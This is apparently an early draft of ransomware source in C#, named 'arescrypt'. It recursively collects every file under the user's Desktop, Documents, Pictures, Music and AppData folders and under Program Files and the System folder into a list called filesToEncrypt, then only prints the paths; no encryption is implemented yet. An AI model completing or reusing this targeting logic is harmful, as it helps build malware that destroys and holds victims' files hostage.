using System;
using System.Linq;

namespace arescrypt
{
    class Program
    {
        static string sessionUsername = Environment.UserName; // get current sessions username

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, " + sessionUsername);

            var userSpecificDirs = new System.Collections.Generic.List<string> { };
            var systemSpecificDirs = new System.Collections.Generic.List<string> { };

            // User specific directories, administrative rights shouldn't be required in order to write to these files
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

            // System specific directories, administrative rights may be required in order to write to these files
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));

            var directoriesToEncrypt = userSpecificDirs.Concat(systemSpecificDirs);
            var filesToEncrypt = new System.Collections.Generic.List<string> { };
            foreach (string directory in directoriesToEncrypt.Distinct().ToList())
            {
                string[] files = System.IO.Directory.GetFiles(directory, "*.*", System.IO.SearchOption.AllDirectories);
                foreach (string file in files)
                    filesToEncrypt.Add(file);
            }

            foreach (string file in filesToEncrypt)
                Console.WriteLine(file);

            Console.Write("\nPress any key to continue . . . ");
            Console.ReadKey(); // Hang the console
        }
    }
}
